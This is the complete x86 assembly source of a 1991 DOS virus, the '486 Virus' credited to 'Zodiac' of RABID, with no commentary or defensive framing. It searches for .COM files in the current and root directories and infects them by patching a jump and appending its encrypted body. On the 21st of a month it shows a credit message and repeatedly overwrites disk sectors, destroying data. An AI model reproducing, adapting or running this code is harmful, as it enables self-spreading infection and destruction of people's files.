
; 486 Virus - (C)1991 RABID, International
; By Zodiac - RABID High Priest, USA


code_seg        segment
                assume cs:code_seg,ds:code_seg
                org    100h

jmpin:          db   0E9h,00,00                  ; JMP 105

start:          push cx
                mov  dx,word ptr cs:[101h]
                add  dx,103h                     ; DX now points to start
                mov  si,dx

                mov  bp,dx                       ; pushes offset of PROG
                add  bp,(prog-start)             ; to stack for RET statement
                push bp                          ; of encrypt
                jmp  short unencrypt

unencrypt:      db   0B0h                        ; mov al,
value           db   00                          ;        xx
                push si
                cmp  al,0
                je   unencret
                add  si,(prog-start)
                mov  cx,lastbyte-prog
unencloop:      mov  ah,[si]
                push cx
                mov  cl,al
                rol  ah,cl
                pop  cx
                mov  [si],ah
                inc  al
                inc  si
                loop unencloop
unencret:       pop  si
                ret

prog:           mov  di,100h
                mov  si,dx
                add  si,(firstthree-start)       ; SI points to 1st six bytes
                mov  cx,3
                rep  movsb                       ; Restores initial 3 bytes
                mov  si,dx

                mov  ah,2Ah
                int  21h
                cmp dl,21
                jne  nokill

kill:           xor  ax,ax
                int  10h
                mov  ah,9
                mov  dx,si
                add  dx,(message-start)
                int  21h
kill_hd:        mov  ax,26
killoop:        mov  cx,255
                xor  dx,dx
                push ax
                int  26h
                popf
                pop  ax
                dec  ax
                cmp  ax,2
                jg   killoop
                jmp  short kill_hd

nokill:         mov  bp,0                        ; BP=0 when in curr. direct.
                mov  dx,(filespec-start)

findfirst:      add  dx,si                       ; SI now points to start
                mov  ah,4Eh
                mov  cx,6
                int  21h
                jc   returningfar

filefound:      mov  dx,dtaname
                cmp  bp,1
                jne  open
                dec  dx
                db   0C6h,06h,9Dh,00h,"\"        ; mov byte ptr [9Dh],"\"

open:           xor  cx,cx
                mov  ax,4301h
                int  21h                         ; sets attribute to normal
                push dx

                mov  ax,3D02h
                int  21h                         ; Opens file found
                jc   returningfar                ; Leaves if error
                mov  bx,ax                       ; BX holds file handle

                mov  dx,si
                add  dx,(firstthree-start)
                mov  cx,3
                mov  ah,3Fh
                int  21h
                jc   close
                mov  di,dx
                cmp  word ptr [di],5A4Dh
                je   close
                cmp  byte ptr [di],0E9h
                jne  go
                db   8Bh,16h,9Ah,00h             ; mov dx,word ptr [dtasize]
                sub  dx,(lastbyte-firstbyte+4)
                cmp  word ptr [di+1],dx
                je   close
                jmp  short go

returningfar:   jmp  short returning

go:             xor  cx,cx
                xor  dx,dx
                mov  ax,4200h
                int  21h                         ; Moves to start of file

                db   0A1h,9Ah,00h                ; mov ax,word ptr [dtasize]

                cmp  ax,486
                jb   closing
                cmp  ax,63000
                ja   closing

                sub  ax,3
                mov  word ptr [si+(newthree-start+1)],ax

                mov  dx,si
                add  dx,(newthree-start)
                mov  cx,3
                mov  ah,40h
                int  21h                         ; Writes jump

                xor  cx,cx
                mov  dx,0
                mov  ax,4202h
                int  21h                         ; Moves to end of file

                push si
                mov  di,si
                add  si,(writebody-start)
                add  di,(lastbyte-start+1)
                mov  cx,(writeends-writebody+2)
                rep  movsb
                pop  si

                mov  bp,si
                add  bp,(donewriting-start)
                push bp                          ; sets up RET of unenc

                mov  bp,si
                add  bp,(lastbyte-start+1)
                call bp

donewriting:    xor  si,si

closing:        jmp  short close

; The following are hubs for conditional jumps

returning:      jmp  short return
finding:        jmp  filefound

close:          mov  ax,5701h
                db   8Bh,0Eh,96h,00h             ; mov cx,[dtatime]
                db   8Bh,16h,98h,00h             ; mov dx,[dtadate]
                int  21h
                mov  ah,3Eh
                int  21h                         ; closes file
                pop  dx
                xor  cx,cx
                db   8Ah,0Eh,95h,00h             ; mov cl,byte ptr [dtaattr]
                mov  ax,4301h
                int  21h

                cmp  si,0
                je   return                      ; checks if file infected

                mov  ah,4Fh
                int  21h                         ; finds next file to infected
                jnc  finding

                cmp  bp,1
                je   return
                mov  bp,1
                mov  dx,(rootspec-start)
                jmp  findfirst

return:         pop  cx
                mov  bp,100h
                jmp  bp                           ; Returns control


writebody:      mov  al,byte ptr [si+(value-start)]
                inc  al
                mov  byte ptr [si+value-start],al
                push bx
                mov  bx,si
                add  bx,(prog-start)
                mov  cx,lastbyte-prog
encloop:        mov  ah,[bx]
                push cx
                mov  cl,al
                ror  ah,cl
                pop  cx
                mov  [bx],ah
                inc  al
                inc  bx
                loop encloop
                pop  bx
                mov  dx,si
                mov  cx,(lastbyte-firstbyte+1)   ; Adds extra byte as pad
                mov  ah,40h
                int  21h                         ; Writes main part
                mov  bp,si
                add  bp,(unencrypt-start)
                jmp  bp
writeends:


; -- DATA -- ;
firstthree      db   0CDh,20h,90h
message         db   '486 Virus - (C)1991 RABID, International'
                db   'By Zodiac - RABID Priest$'
rootspec        db   '\'
filespec        db   '*.COM',0
dtaattr         equ  95h
dtatime         equ  96h
dtadate         equ  98h
dtasize         equ  9Ah
dtaname         equ  9Eh
newthree        db   0E9h,0,0

firstbyte       =    start
lastbyte        =    newthree+2
code_seg        ends
                end  jmpin

